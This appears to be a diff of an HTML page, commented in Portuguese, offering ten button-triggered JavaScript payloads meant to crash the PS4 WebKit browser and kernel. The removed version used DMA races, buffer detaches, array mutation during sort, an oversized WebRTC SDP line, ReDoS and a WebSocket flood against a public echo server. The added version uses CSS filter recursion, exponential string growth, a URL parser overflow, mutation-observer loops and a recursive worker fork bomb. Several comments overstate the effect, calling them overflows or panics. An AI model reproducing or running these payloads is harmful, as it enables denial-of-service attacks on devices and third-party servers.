@@ -1,34 +1,35 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Fatal Kernel/WebKit Crash Suite v12000</title>
+<title>PS4 Deep JSON Analysis Suite v13000</title>
 </head>
 <body>
 
-<h1>SUITE V12000: HARDWARE INTERRUPT & DMA CORRUPTION</h1>
-<p>Status: CRITICAL. Target: DMA Race & Kernel Heap Exhaustion.</p>
+<h1>SUITE V13000: DEEP JSON ANALYSIS VECTORS</h1>
+<p>Status: Critical. Target: Stack Exhaustion & OOM Panic.</p>
 <hr>
 
-<button onclick="crashWebGLDMARace()">01. WebGL Texture Upload DMA vs Buffer Delete Race (GPU IOMMU Panic)</button>
+<button onclick="crashCSSFilterStack()">01. CSS Filter Recursion Stack Overflow (RenderLayer Crash)</button>
 
-<button onclick="crashConvolverNode()">02. Audio ConvolverNode Buffer Detach during FFT Process (DSP Panic)</button>
+<button onclick="crashStringReplaceOOM()">02. String Replace Exponential Growth (Allocator Panic)</button>
 
-<button onclick="crashArraySortMutation()">03. Array.prototype.sort Unsafe Mutation (JSC Heap Corruption)</button>
+<button onclick="crashWebGLStencilMismatch()">03. WebGL Stencil/Depth Attachment Mismatch (GPU Panic)</button>
 
-<button onclick="crashSDPLineOverflow()">04. WebRTC SDP Line Parser Integer Overflow (NetStack Stack Smash)</button>
+<button onclick="crashFormDataFlood()">04. FormData Multipart Parser Buffer Overflow</button>
 
-<button onclick="crashCanvasGradientUAF()">05. Canvas CreateLinearGradient Use-After-Free (Render Engine Crash)</button>
+<button onclick="crashPath2DWinding()">05. Path2D 'addPath' Recursive Winding (Graphics Stack Overflow)</button>
 
-<button onclick="crashFileReaderSyncBomb()">06. FileReaderSync Massive Blob Allocation (Kernel OOM Panic)</button>
+<button onclick="crashReduceRightMutation()">06. Array.reduceRight Mutation Race (JSC Index Error)</button>
 
-<button onclick="crashCSSCounterRecursion()">07. CSS Counters Recursive Increment (Layout Stack Overflow)</button>
+<button onclick="crashURLParser()">07. URL Parser Buffer Overflow via Huge Scheme</button>
 
-<button onclick="crashWebSocketFragmentation()">08. WebSocket 0-Byte Fragment Flood (Network Buffer Exhaustion)</button>
+<button onclick="crashClassListToggle()">08. ClassList.toggle Recursion (DOM Update Loop)</button>
 
-<button onclick="crashNodeRemovalRecursion()">09. DOMNodeRemoved Recursive Tree Destruction (UAF)</button>
+<button onclick="crashSelectionFlooding()">09. Selection AddRange Memory Exhaustion</button>
 
-<button onclick="crashRegExpBacktrack()">10. RegExp Catastrophic Backtracking (Thread Hang/Crash)</button>
+<button onclick="crashNestedWorkerBomb()">10. Nested Worker Recursive Spawn (Kernel Process Limit)</button>
 
 <div id="log"></div>
 
@@ -37,251 +38,207 @@
         document.getElementById('log').innerText += "\n" + msg;
     }
 
-    // 01. WebGL Texture DMA Race
-    // Alvo: sceGnmDriver (GPU Direct Memory Access)
-    // Lógica: Iniciar um upload de textura (que usa DMA assíncrono).
-    // Deletar o buffer de origem IMEDIATAMENTE.
-    // O hardware tenta ler RAM que foi marcada como livre.
-    function crashWebGLDMARace() {
-        const c = document.createElement('canvas');
-        const gl = c.getContext('webgl');
-        if(!gl) return log("WebGL off");
-
-        const tex = gl.createTexture();
-        gl.bindTexture(gl.TEXTURE_2D, tex);
-
-        // Cria um buffer PBO (Pixel Buffer Object) simulado via ArrayBuffer
-        const size = 2048 * 2048 * 4; // 16MB texture
-        const buf = new Uint8Array(size).fill(0xAA);
+    // 01. CSS Filter Recursion Stack Overflow
+    // Símbolo: WebCore::RenderLayer::updateLayerPositions
+    function crashCSSFilterStack() {
+        const div = document.createElement('div');
+        document.body.appendChild(div);
         
-        // Worker para detachar a memória
-        const w = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));
-
-        // Race condition apertada
-        setTimeout(() => {
-            // Tenta enviar para a GPU
-            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, buf);
-            // Força flush do comando para o driver
-            gl.flush();
-        }, 0);
-
-        setTimeout(() => {
-            // Remove a memória debaixo dos pés do driver
-            w.postMessage(buf.buffer, [buf.buffer]);
-            // Tenta deletar a textura também
-            gl.deleteTexture(tex);
-        }, 0);
-    }
-
-    // 02. Audio ConvolverNode Buffer Detach
-    // Alvo: Audio DSP (Digital Signal Processor)
-    // Lógica: ConvolverNode faz FFT (Transformada Rápida de Fourier) complexa.
-    // Se removermos o buffer de áudio durante o processamento matemático, o DSP acessa lixo.
-    function crashConvolverNode() {
-        if(!window.AudioContext) return;
-        const ctx = new AudioContext();
-        const conv = ctx.createConvolver();
-        const osc = ctx.createOscillator();
-        
-        // Buffer grande para garantir tempo de processamento
-        const len = ctx.sampleRate * 2;
-        const buffer = ctx.createBuffer(2, len, ctx.sampleRate);
-        // Preenche com ruído
-        for(let i=0; i<len; i++) buffer.getChannelData(0)[i] = Math.random();
-
-        conv.buffer = buffer;
-        osc.connect(conv);
-        conv.connect(ctx.destination);
-        
-        // Pega o array buffer cru
-        const ab = buffer.getChannelData(0).buffer;
-        const w = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));
-
-        osc.start();
-        
-        // O GOLPE: Detach durante a convolução ativa
-        setTimeout(() => {
-            w.postMessage(ab, [ab]);
-            // Tenta trocar o buffer para null simultaneamente
-            try { conv.buffer = null; } catch(e){}
-        }, 10);
-    }
-
-    // 03. Array.prototype.sort Unsafe Mutation
-    // Alvo: JSC Array Storage
-    // Lógica: O algoritmo de sort do JSC não espera que o array mude de tamanho durante a comparação.
-    // Se mudarmos o tamanho, os índices internos do algoritmo apontam para fora da memória alocada.
-    function crashArraySortMutation() {
-        const arr = [];
-        for(let i=0; i<1000; i++) arr.push(i);
-
-        // Comparator malicioso
-        arr.sort((a, b) => {
-            if (a === 50) {
-                // Destroi o array no meio do sort
-                arr.length = 0;
-                // Enche o heap com lixo para ocupar o espaço
-                const junk = [];
-                for(let k=0; k<1000; k++) junk.push(1.1);
-            }
-            return a - b;
-        });
-    }
-
-    // 04. WebRTC SDP Line Parser Integer Overflow
-    // Alvo: NetStack SDP Parser
-    // Lógica: Criar uma linha SDP que excede o buffer de leitura de linha (geralmente 1024 ou 4096 bytes).
-    function crashSDPLineOverflow() {
-        if (!window.RTCPeerConnection) return;
-        const pc = new RTCPeerConnection();
-        
-        // Header válido
-        let sdp = "v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\ns=-\r\nt=0 0\r\n";
-        sdp += "m=audio 1234 RTP/AVP 0\r\n";
-        
-        // Linha de atributo maliciosa: a=fmtp:... sem quebra de linha por 100KB
-        // Isso força overflow no buffer de stack do parser C
-        let overflow = "a=fmtp:0 ";
-        for(let i=0; i<100000; i++) overflow += "A"; 
-        sdp += overflow + "\r\n";
-
-        const desc = { type: 'offer', sdp: sdp };
-        pc.setRemoteDescription(desc).catch(e=>{});
-    }
-
-    // 05. Canvas CreateLinearGradient Use-After-Free
-    // Alvo: WebCore Render Object
-    function crashCanvasGradientUAF() {
-        const c = document.createElement('canvas');
-        const ctx = c.getContext('2d');
-        let grad = ctx.createLinearGradient(0,0,100,100);
-        
-        // Adiciona referências
-        ctx.fillStyle = grad;
-        
-        // Tenta destruir o objeto gradiente (em JS não tem free explícito, 
-        // mas tentamos invalidar via reset de contexto)
-        c.width = 0; // Reseta o contexto
-        c.width = 100;
-        
-        // O estilo ainda aponta para o gradiente antigo?
-        // Em alguns builds do WebKit, isso deixa um ponteiro pendurado
-        ctx.fillRect(0,0,100,100); 
-        
-        // Adiciona stops no gradiente "morto" se a referência JS persistiu
-        try {
-            grad.addColorStop(0.5, 'red');
-        } catch(e) {}
-    }
-
-    // 06. FileReaderSync Massive Blob Allocation
-    // Alvo: Kernel Virtual Memory (Swap/OOM)
-    function crashFileReaderSyncBomb() {
-        // Tenta criar um Blob maior que a RAM física disponível para o navegador
-        // PS4 tem limite restrito (~1-2GB para app).
-        const chunks = [];
-        try {
-            for(let i=0; i<100; i++) {
-                chunks.push(new Uint8Array(1024 * 1024 * 10)); // 10MB chunks
-            }
-        } catch(e) {}
-        
-        const blob = new Blob(chunks);
-        
-        // Worker síncrono para travar a thread e forçar leitura
-        const w = new Worker(URL.createObjectURL(new Blob([`
-            onmessage = function(e) {
-                const fr = new FileReaderSync();
-                // Tenta ler tudo para a memória de uma vez
-                // Isso deve disparar o OOM Killer do Kernel ou Panic
-                fr.readAsArrayBuffer(e.data);
-            }
-        `], {type:'text/javascript'})));
-        
-        w.postMessage(blob);
-    }
-
-    // 07. CSS Counter Recursion
-    // Alvo: CSS Layout Engine (CalcStack)
-    function crashCSSCounterRecursion() {
-        const style = document.createElement('style');
-        // Define contadores aninhados recursivamente
-        style.textContent = `
-            div { counter-increment: c 1; }
-            div::before { content: counter(c); }
-        `;
-        document.head.appendChild(style);
-        
-        const root = document.createElement('div');
-        let curr = root;
-        // Profundidade insana de aninhamento DOM + Contadores CSS
-        for(let i=0; i<10000; i++) {
-            const el = document.createElement('div');
-            curr.appendChild(el);
-            curr = el;
+        // Cria uma string de filtro CSS absurdamente longa e aninhada
+        // O parser e o renderer tentam processar isso recursivamente
+        let filter = "drop-shadow(0 0 1px red) ";
+        for(let i=0; i<5000; i++) {
+            filter += "drop-shadow(0 0 1px red) ";
         }
         
-        document.body.appendChild(root);
-        // Força reflow (cálculo de layout)
-        root.offsetHeight; 
+        try {
+            div.style.filter = filter;
+            // Força o cálculo de layout acessando offsetHeight
+            const forceLayout = div.offsetHeight; 
+        } catch(e) {}
     }
 
-    // 08. WebSocket 0-Byte Fragment Flood
-    // Alvo: Network Buffer Management (Mbufs)
-    function crashWebSocketFragmentation() {
-        const ws = new WebSocket("wss://echo.websocket.org");
-        ws.onopen = () => {
-            // Envia milhares de frames de 0 bytes ou 1 byte
-            // Cada frame consome um header e uma estrutura de alocação no kernel
-            // Isso fragmenta o heap de rede (mbuf clusters)
-            const buf = new Uint8Array(1);
-            setInterval(() => {
-                for(let i=0; i<1000; i++) {
-                    if(ws.readyState === 1) ws.send(buf);
+    // 02. String Replace Exponential Growth
+    // Símbolo: JSC::JSString::replace
+    function crashStringReplaceOOM() {
+        let str = "a";
+        // Crescimento exponencial rápido
+        // Tenta alocar gigabytes de string em segundos
+        // PS4 tem memória limitada para Userland, isso deve causar Panic no alocador
+        try {
+            for(let i=0; i<32; i++) {
+                str = str.replace(/a/g, "aa"); 
+                // Se o replace for otimizado (Rope), a leitura força 'flattening'
+                if (i % 5 === 0) {
+                    const char = str.charAt(str.length - 1);
                 }
-            }, 10);
-        };
+            }
+        } catch(e) {}
     }
 
-    // 09. DOMNodeRemoved Recursive Tree Destruction
-    // Alvo: WebCore Tree Mutator
-    function crashNodeRemovalRecursion() {
-        const root = document.createElement('div');
-        const child = document.createElement('div');
-        root.appendChild(child);
-        document.body.appendChild(root);
+    // 03. WebGL Stencil/Depth Attachment Mismatch
+    // Símbolo: sceGnmDriver::setDepthStencil
+    function crashWebGLStencilMismatch() {
+        const c = document.createElement('canvas');
+        const gl = c.getContext('webgl');
+        
+        const fb = gl.createFramebuffer();
+        gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
+        
+        const rboColor = gl.createRenderbuffer();
+        gl.bindRenderbuffer(gl.RENDERBUFFER, rboColor);
+        gl.renderbufferStorage(gl.RENDERBUFFER, gl.RGBA4, 100, 100);
+        gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.RENDERBUFFER, rboColor);
+        
+        // Cria um buffer de Stencil com tamanho DIFERENTE do buffer de Cor
+        // Drivers antigos crasham ao tentar calcular a interseção das áreas
+        const rboStencil = gl.createRenderbuffer();
+        gl.bindRenderbuffer(gl.RENDERBUFFER, rboStencil);
+        gl.renderbufferStorage(gl.RENDERBUFFER, gl.STENCIL_INDEX8, 2048, 2048); // Tamanho mismatch
+        gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.STENCIL_ATTACHMENT, gl.RENDERBUFFER, rboStencil);
+        
+        try {
+            gl.clear(gl.COLOR_BUFFER_BIT | gl.STENCIL_BUFFER_BIT);
+            gl.drawArrays(gl.POINTS, 0, 1);
+            gl.finish();
+        } catch(e) {}
+    }
 
-        root.addEventListener('DOMNodeRemoved', function(e) {
-            // Quando removemos algo, adicionamos algo novo que dispara remoção antiga?
-            // Tenta criar um ciclo de eventos de mutação
-            const n = document.createElement('div');
+    // 04. FormData Multipart Parser Buffer Overflow
+    // Símbolo: WebCore::FormDataBuilder
+    function crashFormDataFlood() {
+        const fd = new FormData();
+        
+        // Adiciona milhares de campos pequenos
+        // O construtor de multipart/form-data tenta criar boundaries únicos
+        // O buffer interno pode estourar ao serializar
+        for(let i=0; i<50000; i++) {
+            fd.append("field" + i, "value");
+        }
+        
+        // Tenta enviar via XHR para forçar a serialização no kernel network stack
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", "/crash");
+        try {
+            xhr.send(fd);
+        } catch(e) {}
+    }
+
+    // 05. Path2D 'addPath' Recursive Winding
+    // Símbolo: WebCore::Path::addPath
+    function crashPath2DWinding() {
+        const p1 = new Path2D();
+        p1.rect(0,0,10,10);
+        
+        let pFinal = new Path2D();
+        
+        // Adiciona o mesmo caminho milhares de vezes com transformações
+        // Isso cria uma lista de comandos gráficos enorme para o driver processar
+        try {
+            for(let i=0; i<10000; i++) {
+                const matrix = document.createElementNS("http://www.w3.org/2000/svg", "svg").createSVGMatrix();
+                pFinal.addPath(p1, matrix);
+            }
+            
+            const c = document.createElement('canvas');
+            const ctx = c.getContext('2d');
+            // Rasterizar isso pode estourar a stack do driver gráfico
+            ctx.fill(pFinal, "evenodd");
+        } catch(e) {}
+    }
+
+    // 06. Array.reduceRight Mutation Race
+    // Símbolo: JSC::ArrayPrototype::reduceRight
+    function crashReduceRightMutation() {
+        const arr = [0, 1, 2, 3, 4];
+        
+        try {
+            arr.reduceRight((acc, val, idx, theArr) => {
+                // Mutação destrutiva durante a iteração reversa
+                if (idx === 2) {
+                    theArr.length = 0; // Zera o array
+                    // Tenta confundir o iterador interno do JSC
+                    // O motor C++ pode ter cached o ponteiro do buffer
+                    for(let k=0; k<1000; k++) theArr.push(1.1); 
+                }
+                return acc + val;
+            });
+        } catch(e) {}
+    }
+
+    // 07. URL Parser Buffer Overflow via Huge Scheme
+    // Símbolo: WebCore::URLParser
+    function crashURLParser() {
+        // Tenta criar uma URL com um esquema (protocolo) maior que o buffer de stack (geralmente 4KB)
+        let hugeScheme = "A".repeat(10000);
+        let urlString = hugeScheme + "://google.com";
+        
+        try {
+            // O parser tenta validar o esquema
+            new URL(urlString);
+            
+            // Se passar, tenta atribuir ao location (processamento extra)
+            window.history.pushState({}, "", urlString);
+        } catch(e) {}
+    }
+
+    // 08. ClassList.toggle Recursion (DOM Update Loop)
+    // Símbolo: WebCore::DOMTokenList
+    function crashClassListToggle() {
+        const div = document.createElement('div');
+        document.body.appendChild(div);
+        
+        // Observer que reage a mudanças de atributo
+        const obs = new MutationObserver(() => {
+            // Se a classe mudou, muda de novo!
+            // Loop síncrono infinito que consome stack
             try {
-                document.body.appendChild(n);
-                document.body.removeChild(n); // Recursão indireta
+                div.classList.toggle("crash");
             } catch(e) {}
         });
-
-        document.body.removeChild(root);
+        
+        obs.observe(div, {attributes: true});
+        
+        // Trigger inicial
+        div.classList.add("start");
     }
 
-    // 10. RegExp Catastrophic Backtracking
-    // Alvo: Main Thread Watchdog / Kernel Scheduler
-    function crashRegExpBacktrack() {
-        // Expressão clássica de ReDoS (Regular Expression Denial of Service)
-        // (x+x+)+y
-        const re = /([a-zA-Z]+)*$/;
+    // 09. Selection AddRange Memory Exhaustion
+    // Símbolo: WebCore::Selection::addRange
+    function crashSelectionFlooding() {
+        const sel = window.getSelection();
+        const root = document.createElement('div');
+        document.body.appendChild(root);
         
-        // String longa que quase casa, mas falha no final
-        const str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"; 
+        // Cria milhares de ranges
+        // O Firefox/WebKit geralmente tem limite, mas se o limite for alto, consome muita RAM
+        try {
+            for(let i=0; i<10000; i++) {
+                const p = document.createElement('p');
+                root.appendChild(p);
+                const range = document.createRange();
+                range.selectNode(p);
+                sel.addRange(range);
+            }
+        } catch(e) {}
+    }
+
+    // 10. Nested Worker Bomb
+    // Símbolo: Kernel::sys_fork / sys_kthread_create
+    function crashNestedWorkerBomb() {
+        // Código do worker que cria outro worker recursivamente
+        // O PS4 tem um limite rígido de threads/processos. Atingir esse limite rápido causa panic.
+        const workerCode = `
+            try {
+                const blob = new Blob(["(" + arguments.callee.toString() + ")()"], {type: "text/javascript"});
+                const url = URL.createObjectURL(blob);
+                new Worker(url);
+                new Worker(url); // Bifurcação (2^n)
+            } catch(e) {}
+        `;
         
-        // Em WebKit antigo, isso roda na Main Thread e trava a UI
-        // Se consumir muita CPU sem ceder, o Kernel watchdog pode matar o processo
-        re.test(str);
-        
-        // Versão mais agressiva para estourar buffer interno
-        const re2 = /(x+x+)+y/;
-        const str2 = "x".repeat(5000);
-        re2.test(str2);
+        const blob = new Blob([workerCode], {type: "text/javascript"});
+        new Worker(URL.createObjectURL(blob));
     }
 </script>
 
